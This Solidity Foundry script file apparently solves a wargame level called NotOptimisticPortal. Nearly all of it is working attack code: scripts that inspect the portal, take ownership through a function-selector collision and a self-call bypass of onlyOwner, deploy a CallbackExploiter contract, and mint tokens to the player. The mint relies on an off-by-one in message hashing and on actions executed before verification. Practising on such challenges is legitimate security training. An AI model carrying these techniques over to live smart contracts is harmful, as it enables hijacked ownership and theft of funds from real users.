// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../../../src/levels/40_NotOptimisticPortal/CallbackExploiter.sol";

/**
 * @title NotOptimisticPortal Attack
 * @notice Exploits three combined vulnerabilities:
 *         1. Function selector collision: transferOwnership_____610165642(address) == onMessageReceived(bytes) == 0x3a69197e
 *         2. Off-by-one in _computeMessageSlot: last array element not included in hash
 *         3. CEI violation: operations execute BEFORE verification
 *         4. Self-call bypass: onlyOwner allows msg.sender == address(this)
 */
contract NotOptimisticPortalAttackScript is Script {
    // Target selector that both onMessageReceived(bytes) and transferOwnership share
    bytes4 constant TARGET_SELECTOR = 0x3a69197e;

    function run() external {
        address portalAddress = vm.envAddress("NOTOPTIMISTICPORTAL_TARGET");
        address player = vm.envAddress("PLAYER_ADDRESS");

        console.log("========================================");
        console.log("NotOptimisticPortal Attack");
        console.log("========================================");
        console.log("Portal:", portalAddress);
        console.log("Player:", player);

        INotOptimisticPortal portal = INotOptimisticPortal(portalAddress);

        // Query current state
        console.log("\n--- Current State ---");
        console.log("Owner:", portal.owner());
        console.log("Sequencer:", portal.sequencer());
        console.log("Governance:", portal.governance());
        console.log("Latest Block Hash:", vm.toString(portal.latestBlockHash()));
        console.log("Latest Block Number:", portal.latestBlockNumber());
        console.log("Latest Block Timestamp:", portal.latestBlockTimestamp());
        console.log("Buffer Counter:", portal.bufferCounter());

        // Check state roots
        console.log("\n--- State Roots ---");
        for (uint16 i = 0; i < 5; i++) {
            bytes32 root = portal.l2StateRoots(i);
            if (root != bytes32(0)) {
                console.log("l2StateRoots[%d]: %s", i, vm.toString(root));
            }
        }

        console.log("\n--- Player Balance ---");
        console.log("Token Balance:", portal.balanceOf(player));

        // Compute what the withdrawalHash would be for various parameters
        console.log("\n--- Potential Message Hashes ---");

        // With empty message arrays (off-by-one means hash uses zeros)
        // hash = keccak256(abi.encode(tokenReceiver, amount, 0, 0, salt))
        bytes32 hash1 = keccak256(abi.encode(player, uint256(0), bytes32(0), bytes32(0), uint256(0)));
        console.log("Hash(player, 0, 0, 0, 0):", vm.toString(hash1));
        console.log("Executed?", portal.executedMessages(hash1));

        bytes32 hash2 = keccak256(abi.encode(player, uint256(1 ether), bytes32(0), bytes32(0), uint256(0)));
        console.log("Hash(player, 1 ether, 0, 0, 0):", vm.toString(hash2));
        console.log("Executed?", portal.executedMessages(hash2));

        // Try with salt = 1
        bytes32 hash3 = keccak256(abi.encode(player, uint256(0), bytes32(0), bytes32(0), uint256(1)));
        console.log("Hash(player, 0, 0, 0, 1):", vm.toString(hash3));
        console.log("Executed?", portal.executedMessages(hash3));

        console.log("\n========================================");
        console.log("Analysis complete. Check state roots for attack vector.");
        console.log("========================================");
    }
}

/**
 * @title Phase 2: Become Owner Attack
 */
contract BecomeOwnerScript is Script {
    bytes4 constant TARGET_SELECTOR = 0x3a69197e;

    function run() external {
        address portalAddress = vm.envAddress("NOTOPTIMISTICPORTAL_TARGET");
        address player = vm.envAddress("PLAYER_ADDRESS");

        INotOptimisticPortal portal = INotOptimisticPortal(portalAddress);

        console.log("========================================");
        console.log("Phase 2: Become Owner via Self-Call");
        console.log("========================================");

        // The attack:
        // 1. Call executeMessage with portal as the receiver
        // 2. The calldata starts with 0x3a69197e (passes selector check)
        // 3. Portal calls itself with transferOwnership_____610165642(player)
        // 4. onlyOwner passes because msg.sender == address(this)
        // 5. With array length 1, the operation is NOT in the verified hash

        address[] memory receivers = new address[](1);
        receivers[0] = portalAddress;

        bytes[] memory data = new bytes[](1);
        // Encode: selector 0x3a69197e + address(player)
        // This matches both onMessageReceived(bytes) AND transferOwnership_____610165642(address)
        data[0] = abi.encodeWithSelector(TARGET_SELECTOR, player);

        INotOptimisticPortal.ProofData memory proofs = INotOptimisticPortal.ProofData({
            stateTrieProof: hex"",
            storageTrieProof: hex"",
            accountStateRlp: hex""
        });

        // Compute the hash that will be verified
        // With length 1, the loop runs 0 times, so both accumulated hashes are 0
        bytes32 expectedHash = keccak256(abi.encode(player, uint256(0), bytes32(0), bytes32(0), uint256(0)));
        console.log("Expected hash to verify:", vm.toString(expectedHash));
        console.log("Is this hash already executed?", portal.executedMessages(expectedHash));

        console.log("\nAttempting attack...");
        console.log("Current owner:", portal.owner());

        vm.startBroadcast();

        // This will:
        // 1. Execute transferOwnership(player) via self-call
        // 2. Try to verify proofs (might fail if no valid proofs)
        try portal.executeMessage(
            player,     // tokenReceiver
            0,          // amount
            receivers,  // [portal]
            data,       // [transferOwnership calldata]
            0,          // salt
            proofs,     // empty proofs (might fail)
            0           // bufferIndex
        ) {
            console.log("Attack succeeded!");
        } catch Error(string memory reason) {
            console.log("Attack failed:", reason);
        } catch {
            console.log("Attack failed with unknown error");
        }

        vm.stopBroadcast();

        console.log("\nNew owner:", portal.owner());
        if (portal.owner() == player) {
            console.log("SUCCESS: We are now the owner!");
        }
    }
}

/**
 * @title Deploy CallbackExploiter
 * @notice Deploys the CallbackExploiter contract needed for the attack
 */
contract DeployExploiterScript is Script {
    function run() external returns (address) {
        address portalAddress = vm.envAddress("NOTOPTIMISTICPORTAL_TARGET");
        address player = vm.envAddress("PLAYER_ADDRESS");

        console.log("========================================");
        console.log("Deploying CallbackExploiter");
        console.log("========================================");
        console.log("Portal:", portalAddress);
        console.log("Player:", player);

        vm.startBroadcast();

        CallbackExploiter exploiter = new CallbackExploiter(portalAddress, player);

        vm.stopBroadcast();

        console.log("\nExploiter deployed at:", address(exploiter));
        console.log("\nNow run the TypeScript script to generate proofs:");
        console.log("  cd script/levels/40_NotOptimisticPortal");
        console.log("  npm install");
        console.log("  npx ts-node generateProofs.ts \\");
        console.log("    ", player, " \\");
        console.log("    ", portalAddress, " \\");
        console.log("    ", address(exploiter), " \\");

        INotOptimisticPortal portal = INotOptimisticPortal(portalAddress);
        console.log("    ", vm.toString(portal.latestBlockHash()), " \\");
        console.log("    ", portal.latestBlockNumber(), " \\");
        console.log("    ", portal.latestBlockTimestamp());

        return address(exploiter);
    }
}

/**
 * @title Full Attack Script
 * @notice Executes the complete attack with pre-generated proofs
 * @dev Requires proof data to be passed as environment variables or hardcoded
 */
contract FullAttackScript is Script {
    bytes4 constant TARGET_SELECTOR = 0x3a69197e;

    function run() external {
        address portalAddress = vm.envAddress("NOTOPTIMISTICPORTAL_TARGET");
        address player = vm.envAddress("PLAYER_ADDRESS");
        address exploiterAddress = vm.envAddress("EXPLOITER_ADDRESS");

        INotOptimisticPortal portal = INotOptimisticPortal(portalAddress);
        CallbackExploiter exploiter = CallbackExploiter(exploiterAddress);

        console.log("========================================");
        console.log("Full NotOptimisticPortal Attack");
        console.log("========================================");
        console.log("Portal:", portalAddress);
        console.log("Player:", player);
        console.log("Exploiter:", exploiterAddress);

        // Display current state
        console.log("\n--- Before Attack ---");
        console.log("Owner:", portal.owner());
        console.log("Sequencer:", portal.sequencer());
        console.log("Buffer Counter:", portal.bufferCounter());
        console.log("Player Balance:", portal.balanceOf(player));

        // These values should be generated by the TypeScript script
        // For now, using placeholders - replace with actual generated values
        bytes memory rlpBlockHeader = vm.envBytes("RLP_BLOCK_HEADER");
        bytes memory stateTrieProof = vm.envBytes("STATE_TRIE_PROOF");
        bytes memory storageTrieProof = vm.envBytes("STORAGE_TRIE_PROOF");
        bytes memory accountStateRlp = vm.envBytes("ACCOUNT_STATE_RLP");

        uint256 amount = 1 ether; // Amount of tokens to mint
        uint256 salt = 0;
        uint16 bufferIndex = portal.bufferCounter(); // Points to our new state root after submitNewBlock

        // Compute the expected withdrawal hash
        bytes32 withdrawalHash = exploiter.computeWithdrawalHash(amount, salt);
        console.log("\nWithdrawal Hash:", vm.toString(withdrawalHash));

        vm.startBroadcast();

        // Step 1: Set the block header on the exploiter
        console.log("\nStep 1: Setting block header on exploiter...");
        exploiter.setBlockHeader(rlpBlockHeader);

        // Step 2: Execute the attack
        console.log("Step 2: Executing attack...");
        INotOptimisticPortal.ProofData memory proofs = INotOptimisticPortal.ProofData({
            stateTrieProof: stateTrieProof,
            storageTrieProof: storageTrieProof,
            accountStateRlp: accountStateRlp
        });

        exploiter.attack(amount, salt, proofs, bufferIndex);

        vm.stopBroadcast();

        // Verify results
        console.log("\n--- After Attack ---");
        console.log("Owner:", portal.owner());
        console.log("Sequencer:", portal.sequencer());
        console.log("Player Balance:", portal.balanceOf(player));

        if (portal.balanceOf(player) > 0) {
            console.log("\n========================================");
            console.log("SUCCESS! Tokens minted to player!");
            console.log("========================================");
        }
    }
}

/**
 * @title Debug Script
 * @notice Helps debug the attack by computing hashes and checking state
 */
contract DebugScript is Script {
    bytes4 constant TARGET_SELECTOR = 0x3a69197e;

    function run() external view {
        address portalAddress = vm.envAddress("NOTOPTIMISTICPORTAL_TARGET");
        address player = vm.envAddress("PLAYER_ADDRESS");

        INotOptimisticPortal portal = INotOptimisticPortal(portalAddress);

        console.log("========================================");
        console.log("Debug Information");
        console.log("========================================");

        // Current state
        console.log("\n--- Portal State ---");
        console.log("Owner:", portal.owner());
        console.log("Sequencer:", portal.sequencer());
        console.log("Governance:", portal.governance());
        console.log("Latest Block Hash:", vm.toString(portal.latestBlockHash()));
        console.log("Latest Block Number:", portal.latestBlockNumber());
        console.log("Latest Block Timestamp:", portal.latestBlockTimestamp());
        console.log("Buffer Counter:", portal.bufferCounter());
        console.log("Player Balance:", portal.balanceOf(player));

        // Compute hashes for different scenarios
        console.log("\n--- Hash Computations ---");

        // For the attack with 2 receivers [portal, exploiter]
        // Only receiver[0] (portal) is included in hash due to off-by-one
        address fakeExploiter = address(0x1234);
        bytes memory transferCalldata = abi.encodeWithSelector(TARGET_SELECTOR, fakeExploiter);

        bytes32 receiversHash = keccak256(abi.encode(bytes32(0), portalAddress));
        bytes32 datasHash = keccak256(abi.encode(bytes32(0), transferCalldata));

        console.log("Receivers Hash (portal only):", vm.toString(receiversHash));
        console.log("Datas Hash (transferOwnership only):", vm.toString(datasHash));

        // Final hash with amount = 1 ether, salt = 0
        bytes32 withdrawalHash = keccak256(abi.encode(
            player,
            uint256(1 ether),
            receiversHash,
            datasHash,
            uint256(0)
        ));
        console.log("Withdrawal Hash (1 ETH, salt=0):", vm.toString(withdrawalHash));
        console.log("Already executed?", portal.executedMessages(withdrawalHash));

        console.log("\n========================================");
        console.log("Use these values for proof generation:");
        console.log("  Player:", player);
        console.log("  Portal:", portalAddress);
        console.log("  Latest Block Hash:", vm.toString(portal.latestBlockHash()));
        console.log("  Latest Block Number:", portal.latestBlockNumber());
        console.log("  Latest Block Timestamp:", portal.latestBlockTimestamp());
        console.log("========================================");
    }
}
